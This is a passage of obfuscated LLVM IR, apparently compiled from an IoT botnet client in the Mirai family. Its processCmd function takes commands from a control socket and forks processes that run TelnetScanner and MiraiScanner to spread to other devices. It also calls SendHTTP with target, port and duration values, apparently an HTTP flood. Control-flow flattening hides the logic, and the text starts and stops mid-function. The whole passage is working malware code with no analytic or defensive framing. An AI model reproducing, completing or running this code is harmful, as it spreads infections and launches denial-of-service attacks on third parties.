  %56 = select i1 %55, i32 1259516213, i32 104573419
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 104573419, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 748483737, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 -313678812, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 -349809508, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %44, %43, %29, %24, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #9
  store i32 %41, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 987373994, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 987373994, label %first
    i32 1941940839, label %44
    i32 -546873457, label %45
    i32 -754322192, label %52
    i32 -238924663, label %59
    i32 942218212, label %66
    i32 1660933712, label %67
    i32 69678504, label %71
    i32 1438606663, label %72
    i32 1368033102, label %76
    i32 -1650826221, label %78
    i32 1545195441, label %82
    i32 1424073041, label %83
    i32 263260153, label %84
    i32 634842237, label %85
    i32 -832409257, label %90
    i32 895414390, label %105
    i32 -1747232038, label %108
    i32 -571294789, label %109
    i32 -326016901, label %116
    i32 -148909617, label %120
    i32 1401979634, label %121
    i32 1576094610, label %124
    i32 -1108639059, label %131
    i32 467787328, label %143
    i32 -724943498, label %148
    i32 -1349644150, label %149
    i32 -1408254917, label %150
    i32 634400150, label %157
    i32 -1175021655, label %164
    i32 -6139764, label %171
    i32 -1550012260, label %172
    i32 -748418959, label %176
    i32 -471368175, label %177
    i32 -747163566, label %181
    i32 1497221897, label %183
    i32 -692623031, label %187
    i32 -2030640155, label %188
    i32 1473772708, label %189
    i32 1293002911, label %190
    i32 912667004, label %195
    i32 -1321010792, label %210
    i32 -1324062722, label %213
    i32 -1611942557, label %214
    i32 694127779, label %221
    i32 -1347774, label %225
    i32 156039903, label %226
    i32 10106186, label %229
    i32 1900244007, label %236
    i32 -509688594, label %248
    i32 138893989, label %253
    i32 -1397830858, label %254
    i32 -1923770229, label %255
    i32 -1422568340, label %262
    i32 -1825735590, label %266
    i32 -1258392488, label %273
    i32 -392459614, label %280
    i32 562115755, label %281
    i32 -409296396, label %285
    i32 753221007, label %286
    i32 205882960, label %309
    i32 1892040702, label %316
    i32 -1054168800, label %320
    i32 -1266976370, label %327
    i32 -744348033, label %334
    i32 2083594377, label %341
    i32 -1112169663, label %348
    i32 -63074692, label %352
    i32 240188420, label %359
    i32 -672149984, label %360
    i32 -1016053779, label %379
    i32 953827832, label %384
    i32 -1059074384, label %385
    i32 -102504479, label %390
    i32 -541799062, label %393
    i32 1190820474, label %397
    i32 446800157, label %401
    i32 -328012188, label %408
    i32 1164476070, label %410
    i32 1381680761, label %411
    i32 -1989561886, label %415
    i32 614246533, label %416
    i32 451434160, label %423
    i32 -1559894138, label %424
    i32 -1263910389, label %431
    i32 -1473261451, label %435
    i32 1904704459, label %442
    i32 1215870383, label %449
    i32 1113107093, label %453
    i32 -1827633804, label %460
    i32 -2013195247, label %464
    i32 -656608097, label %471
    i32 -1644450296, label %472
    i32 823685140, label %490
    i32 1618922680, label %495
    i32 1530062033, label %496
    i32 1178538301, label %500
    i32 666580560, label %505
    i32 -1180195284, label %506
    i32 -682681960, label %511
    i32 -1195355862, label %514
    i32 747219134, label %518
    i32 -1410535183, label %522
    i32 -563441354, label %530
    i32 -388661502, label %532
    i32 2139638833, label %533
    i32 1553206457, label %537
    i32 -1018172375, label %538
    i32 330584534, label %546
    i32 25800419, label %547
    i32 -896181812, label %554
    i32 -1240980264, label %558
    i32 1379775645, label %565
    i32 -1989764654, label %572
    i32 -1608597988, label %573
    i32 1527415729, label %589
    i32 742614304, label %592
    i32 -1064984265, label %596
    i32 -54526686, label %600
    i32 -1971131027, label %604
    i32 -1541342440, label %606
    i32 -2061678710, label %607
    i32 1906542272, label %611
    i32 -1663764849, label %612
    i32 399447261, label %616
    i32 1168752833, label %617
    i32 -1439265196, label %624
    i32 -1481833594, label %625
    i32 -1578779978, label %630
    i32 762757674, label %637
    i32 -515521637, label %645
    i32 -804149885, label %653
    i32 473325697, label %654
    i32 1354659042, label %657
    i32 559000749, label %661
    i32 -854277830, label %662
    i32 258220262, label %663
    i32 -1040541468, label %664
    i32 -1827072383, label %671
    i32 682330196, label %672
    i32 2146271427, label %679
    i32 682323236, label %684
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %42 = icmp ne i32 %.reload, 0
  %43 = select i1 %42, i32 -546873457, i32 1941940839
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8**, i8*** %4, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.511, i32 0, i32 0)) #9
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 -1408254917, i32 -754322192
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 -571294789, i32 -238924663
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = call i32 @fork() #5
  store i32 %60, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %61 = call i64 @sysconf(i32 84) #5
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %63 = load i32, i32* %7, align 4
  %64 = icmp eq i32 %63, 1
  %65 = select i1 %64, i32 942218212, i32 1660933712
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 500, i32* %8, align 4
  store i32 1660933712, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %7, align 4
  %69 = icmp sge i32 %68, 2
  %70 = select i1 %69, i32 69678504, i32 1438606663
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 1000, i32* %8, align 4
  store i32 1438606663, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = icmp ugt i32 %73, 0
  %75 = select i1 %74, i32 1368033102, i32 -1650826221
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* %5, align 4
  store i32 %77, i32* @scanPid, align 4
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %5, align 4
  %80 = icmp eq i32 %79, -1
  %81 = select i1 %80, i32 1545195441, i32 1424073041
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 263260153, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 634842237, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* %6, align 4
  %87 = load i32, i32* %7, align 4
  %88 = icmp slt i32 %86, %87
  %89 = select i1 %88, i32 -832409257, i32 -1747232038
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = call i64 @time(i64* null) #5
  %92 = call i32 @getpid() #5
  %93 = sext i32 %92 to i64
  %94 = xor i64 %91, %93
  %95 = call i32 @getppid() #5
  %96 = sext i32 %95 to i64
  %97 = add nsw i64 %94, %96
  %98 = trunc i64 %97 to i32
  call void @srand(i32 %98) #5
  %99 = call i64 @time(i64* null) #5
  %100 = call i32 @getpid() #5
  %101 = sext i32 %100 to i64
  %102 = xor i64 %99, %101
  %103 = trunc i64 %102 to i32
  call void @init_rand(i32 %103)
  %104 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %104)
  call void @_exit(i32 0) #11
  unreachable

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %6, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %6, align 4
  store i32 634842237, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  store i32 -571294789, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 1
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %114 = icmp ne i32 %113, 0
  %115 = select i1 %114, i32 1576094610, i32 -326016901
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* @scanPid, align 4
  %118 = icmp eq i32 %117, 0
  %119 = select i1 %118, i32 -148909617, i32 1401979634
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* @scanPid, align 4
  %123 = call i32 @kill(i32 %122, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  store i32 1576094610, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 1
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @strcmp(i8* %127, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i32 0, i32 0)) #9
  %129 = icmp ne i32 %128, 0
  %130 = select i1 %129, i32 -1349644150, i32 -1108639059
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i8**, i8*** %4, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 1
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @atoi(i8* %134) #9
  store i32 %135, i32* %9, align 4
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 2
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @atoi(i8* %138) #9
  store i32 %139, i32* %10, align 4
  %140 = call i32 @listFork()
  %141 = icmp ne i32 %140, 0
  %142 = select i1 %141, i32 -724943498, i32 467787328
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* @mainCommSock, align 4
  %145 = call i32 (i32, i8*, ...) @sockprintf(i32 %144, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0))
  %146 = load i32, i32* %10, align 4
  %147 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %146, i32 %147)
  call void @_exit(i32 0) #11
  unreachable

; <label>:148:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  store i32 -1408254917, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 0
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @strcmp(i8* %153, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.516, i32 0, i32 0)) #9
  %155 = icmp ne i32 %154, 0
  %156 = select i1 %155, i32 -1923770229, i32 634400150
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8**, i8*** %4, align 8
  %159 = getelementptr inbounds i8*, i8** %158, i64 1
  %160 = load i8*, i8** %159, align 8
  %161 = call i32 @strcmp(i8* %160, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %162 = icmp ne i32 %161, 0
  %163 = select i1 %162, i32 -1611942557, i32 -1175021655
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = call i32 @fork() #5
  store i32 %165, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %166 = call i64 @sysconf(i32 84) #5
  %167 = trunc i64 %166 to i32
  store i32 %167, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %168 = load i32, i32* %13, align 4
  %169 = icmp eq i32 %168, 1
  %170 = select i1 %169, i32 -6139764, i32 -1550012260
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  store i32 500, i32* %14, align 4
  store i32 -1550012260, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %13, align 4
  %174 = icmp sge i32 %173, 2
  %175 = select i1 %174, i32 -748418959, i32 -471368175
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 1000, i32* %14, align 4
  store i32 -471368175, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %11, align 4
  %179 = icmp ugt i32 %178, 0
  %180 = select i1 %179, i32 -747163566, i32 1497221897
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %11, align 4
  store i32 %182, i32* @scanPid, align 4
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %11, align 4
  %185 = icmp eq i32 %184, -1
  %186 = select i1 %185, i32 -692623031, i32 -2030640155
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 1473772708, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 1293002911, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %12, align 4
  %192 = load i32, i32* %13, align 4
  %193 = icmp slt i32 %191, %192
  %194 = select i1 %193, i32 912667004, i32 -1324062722
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = call i64 @time(i64* null) #5
  %197 = call i32 @getpid() #5
  %198 = sext i32 %197 to i64
  %199 = xor i64 %196, %198
  %200 = call i32 @getppid() #5
  %201 = sext i32 %200 to i64
  %202 = add nsw i64 %199, %201
  %203 = trunc i64 %202 to i32
  call void @srand(i32 %203) #5
  %204 = call i64 @time(i64* null) #5
  %205 = call i32 @getpid() #5
  %206 = sext i32 %205 to i64
  %207 = xor i64 %204, %206
  %208 = trunc i64 %207 to i32
  call void @init_rand(i32 %208)
  %209 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %209)
  call void @_exit(i32 0) #11
  unreachable

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i32, i32* %12, align 4
  %212 = add nsw i32 %211, 1
  store i32 %212, i32* %12, align 4
  store i32 1293002911, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  store i32 -1611942557, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 1
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 10106186, i32 694127779
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* @scanPid, align 4
  %223 = icmp eq i32 %222, 0
  %224 = select i1 %223, i32 -1347774, i32 156039903
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i32, i32* @scanPid, align 4
  %228 = call i32 @kill(i32 %227, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  store i32 10106186, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 1
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @strcmp(i8* %232, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i32 0, i32 0)) #9
  %234 = icmp ne i32 %233, 0
  %235 = select i1 %234, i32 -1397830858, i32 1900244007
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8**, i8*** %4, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 1
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #9
  store i32 %240, i32* %15, align 4
  %241 = load i8**, i8*** %4, align 8
  %242 = getelementptr inbounds i8*, i8** %241, i64 2
  %243 = load i8*, i8** %242, align 8
  %244 = call i32 @atoi(i8* %243) #9
  store i32 %244, i32* %16, align 4
  %245 = call i32 @listFork()
  %246 = icmp ne i32 %245, 0
  %247 = select i1 %246, i32 138893989, i32 -509688594
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i32, i32* @mainCommSock, align 4
  %250 = call i32 (i32, i8*, ...) @sockprintf(i32 %249, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0))
  %251 = load i32, i32* %16, align 4
  %252 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 %251, i32 %252)
  call void @_exit(i32 0) #11
  unreachable

; <label>:253:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 -1923770229, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 0
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.518, i32 0, i32 0)) #9
  %260 = icmp ne i32 %259, 0
  %261 = select i1 %260, i32 205882960, i32 -1422568340
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i32, i32* %3, align 4
  %264 = icmp slt i32 %263, 6
  %265 = select i1 %264, i32 -392459614, i32 -1825735590
  store i32 %265, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i8**, i8*** %4, align 8
  %268 = getelementptr inbounds i8*, i8** %267, i64 3
  %269 = load i8*, i8** %268, align 8
  %270 = call i32 @atoi(i8* %269) #9
  %271 = icmp slt i32 %270, 1
  %272 = select i1 %271, i32 -392459614, i32 -1258392488
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 5
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #9
  %278 = icmp slt i32 %277, 1
  %279 = select i1 %278, i32 -392459614, i32 562115755
  store i32 %279, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = call i32 @listFork()
  %283 = icmp ne i32 %282, 0
  %284 = select i1 %283, i32 -409296396, i32 753221007
  store i32 %284, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 1
  %289 = load i8*, i8** %288, align 8
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 2
  %292 = load i8*, i8** %291, align 8
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 3
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #9
  %297 = trunc i32 %296 to i16
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 4
  %300 = load i8*, i8** %299, align 8
  %301 = load i8**, i8*** %4, align 8
  %302 = getelementptr inbounds i8*, i8** %301, i64 5
  %303 = load i8*, i8** %302, align 8
  %304 = call i32 @atoi(i8* %303) #9
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 6
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #9
  call void @SendHTTP(i8* %289, i8* %292, i16 zeroext %297, i8* %300, i32 %304, i32 %308)
  call void @exit(i32 0) #12
  unreachable

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 0
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @strcmp(i8* %312, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.519, i32 0, i32 0)) #9
  %314 = icmp ne i32 %313, 0
  %315 = select i1 %314, i32 -1559894138, i32 1892040702
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load i32, i32* %3, align 4
  %318 = icmp slt i32 %317, 6
  %319 = select i1 %318, i32 240188420, i32 -1054168800
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i8**, i8*** %4, align 8
  %322 = getelementptr inbounds i8*, i8** %321, i64 3
  %323 = load i8*, i8** %322, align 8
  %324 = call i32 @atoi(i8* %323) #9
  %325 = icmp eq i32 %324, -1
  %326 = select i1 %325, i32 240188420, i32 -1266976370
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i8**, i8*** %4, align 8
  %329 = getelementptr inbounds i8*, i8** %328, i64 2
  %330 = load i8*, i8** %329, align 8
  %331 = call i32 @atoi(i8* %330) #9
  %332 = icmp eq i32 %331, -1
  %333 = select i1 %332, i32 240188420, i32 -744348033
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 4
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* %337) #9
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 240188420, i32 2083594377
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i8**, i8*** %4, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i64 4
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @atoi(i8* %344) #9
  %346 = icmp sgt i32 %345, 1024
  %347 = select i1 %346, i32 240188420, i32 -1112169663
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %3, align 4
  %350 = icmp eq i32 %349, 6
  %351 = select i1 %350, i32 -63074692, i32 -672149984
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 5
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @atoi(i8* %355) #9
  %357 = icmp slt i32 %356, 1
  %358 = select i1 %357, i32 240188420, i32 -672149984
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 1
  %363 = load i8*, i8** %362, align 8
  store i8* %363, i8** %17, align 8
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 2
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #9
  store i32 %367, i32* %18, align 4
  %368 = load i8**, i8*** %4, align 8
  %369 = getelementptr inbounds i8*, i8** %368, i64 3
  %370 = load i8*, i8** %369, align 8
  %371 = call i32 @atoi(i8* %370) #9
  store i32 %371, i32* %19, align 4
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 4
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @atoi(i8* %374) #9
  store i32 %375, i32* %20, align 4
  %376 = load i32, i32* %3, align 4
  %377 = icmp eq i32 %376, 6
  %378 = select i1 %377, i32 -1016053779, i32 953827832
  store i32 %378, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 5
  %382 = load i8*, i8** %381, align 8
  %383 = call i32 @atoi(i8* %382) #9
  store i32 -1059074384, i32* %switchVar
  store i32 %383, i32* %.reg2mem2
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 -1059074384, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %386 = load i8*, i8** %17, align 8
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %388 = icmp ne i8* %387, null
  %389 = select i1 %388, i32 -102504479, i32 1381680761
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i8*, i8** %17, align 8
  %392 = call i8* @strtok(i8* %391, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %392, i8** %23, align 8
  store i32 -541799062, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i8*, i8** %23, align 8
